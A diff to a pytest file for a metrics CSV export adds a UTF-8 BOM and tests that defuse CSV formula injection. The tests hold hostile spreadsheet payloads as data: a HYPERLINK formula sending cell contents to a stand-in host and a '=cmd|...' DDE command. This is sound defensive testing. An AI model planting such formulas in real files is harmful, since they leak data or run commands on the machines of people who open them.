@@ -26,6 +26,7 @@ from typing import Any
 import pytest
 from httpx import ASGITransport, AsyncClient
 
+from app.api.routes_runs import _CSV_BOM, _metrics_csv
 from app.config import settings
 from app.core.auth import TOKEN_HEADER, session_token
 from app.core.db import Database
@@ -40,7 +41,7 @@ from app.core.node_base import (
 from app.core.node_registry import registry
 from app.core.run_output_store import RunOutputStore
 from app.core.run_service import QueueLimits, RunService
-from app.core.run_store import RunProvenance, RunStore
+from app.core.run_store import MetricRecord, RunProvenance, RunStore
 from app.main import app
 
 BASE_URL = f"http://127.0.0.1:{settings.PORT}"
@@ -713,7 +714,10 @@ async def test_metrics_csv_export(client):
     assert response.headers["content-type"].startswith("text/csv")
     assert run_id in response.headers["content-disposition"]
 
-    rows = list(csv.reader(io.StringIO(response.text)))
+    # The body leads with a UTF-8 BOM (see _CSV_BOM), which every reader
+    # skips when told the encoding -- hence utf-8-sig here and below.
+    text = response.content.decode("utf-8-sig")
+    rows = list(csv.reader(io.StringIO(text)))
     assert rows[0] == ["run_id", "node_id", "name", "step", "value", "ts"]
     assert len(rows) == 3
     assert [row[2] for row in rows[1:]] == ["loss", "loss"]
@@ -750,9 +754,83 @@ async def test_metrics_csv_for_a_run_with_no_series_is_header_only(client):
     response = await client.get(f"/api/runs/{run_id}/metrics?format=csv")
     assert response.status_code == 200
     assert response.headers["content-type"].startswith("text/csv")
-    assert response.text == "run_id,node_id,name,step,value,ts\n"
-    rows = list(csv.reader(io.StringIO(response.text)))
+    assert response.content == b"\xef\xbb\xbfrun_id,node_id,name,step,value,ts\n"
+    text = response.content.decode("utf-8-sig")
+    rows = list(csv.reader(io.StringIO(text)))
     assert rows == [list(("run_id", "node_id", "name", "step", "value", "ts"))]
+
+
+async def test_metrics_csv_leads_with_a_utf8_bom(client):
+    """``text/csv; charset=utf-8`` is not enough for Excel on Windows, which
+    reads a BOM-less CSV in the ANSI codepage and mangles every non-ASCII
+    metric or node name -- in a product that ships a zh-TW locale."""
+    run_id = (await client.post("/api/runs",
+                                json={"graph": _graph()})).json()["run_id"]
+    await _poll_until_terminal(client, run_id)
+
+    response = await client.get(f"/api/runs/{run_id}/metrics?format=csv")
+    assert response.content.startswith(b"\xef\xbb\xbf")
+
+
+# ── CSV formula injection (#196) ──────────────────────────────────────────
+#
+# csv.writer quotes commas, quotes and newlines correctly, but quoting is
+# not what stops a formula: a spreadsheet EVALUATES a cell whose first
+# character is one of = + - @ tab CR. Two of the six columns are
+# user-influenced -- `name`, which any plugin or custom node picks when it
+# calls context.log_metric, and `node_id`, which comes off the graph JSON.
+
+
+def _one_metric(**overrides):
+    fields = {"run_id": "r1", "node_id": "n1", "name": "loss", "step": 1,
+              "value": 0.5, "ts": "2026-01-01T00:00:00Z"}
+    fields.update(overrides)
+    return MetricRecord(**fields)
+
+
+def _csv_rows(*metrics):
+    body = _metrics_csv("r1", list(metrics))
+    assert body.startswith(_CSV_BOM)
+    return list(csv.reader(io.StringIO(body[len(_CSV_BOM):])))
+
+
+@pytest.mark.parametrize("leader", ["=", "+", "-", "@", "\t", "\r"])
+def test_a_hostile_metric_name_is_not_a_formula(leader):
+    payload = f'{leader}HYPERLINK("http://x/?"&A1,"loss")'
+    rows = _csv_rows(_one_metric(name=payload))
+    assert rows[1][2] == f"'{payload}"
+
+
+def test_a_hostile_node_id_is_not_a_formula():
+    """node_id is emitted verbatim from the graph JSON."""
+    rows = _csv_rows(_one_metric(node_id="=cmd|'/c calc'!A1"))
+    assert rows[1][1] == "'=cmd|'/c calc'!A1"
+
+
+def test_an_ordinary_name_is_not_touched():
+    """The apostrophe must not show up on every row of every export."""
+    rows = _csv_rows(_one_metric(name="val_accuracy", node_id="train-1"))
+    assert rows[1][1:3] == ["train-1", "val_accuracy"]
+
+
+def test_a_negative_value_stays_a_number():
+    """The value column leads with '-' by nature. Quoting it would turn the
+    column into text and break every chart built on the export."""
+    rows = _csv_rows(_one_metric(value=-0.25))
+    assert rows[1][4] == "-0.25"
+    assert float(rows[1][4]) == -0.25
+
+
+def test_a_null_value_is_still_an_empty_cell():
+    """A diverged loss is stored as NULL; the gap must survive the escaping."""
+    rows = _csv_rows(_one_metric(value=None))
+    assert rows[1][4] == ""
+
+
+def test_commas_and_newlines_are_still_quoted_not_escaped():
+    """The neutralisation must not have replaced csv.writer's own quoting."""
+    rows = _csv_rows(_one_metric(name="a,b\nc"))
+    assert rows[1][2] == "a,b\nc"
 
 
 async def test_metrics_reject_an_unknown_format(client):
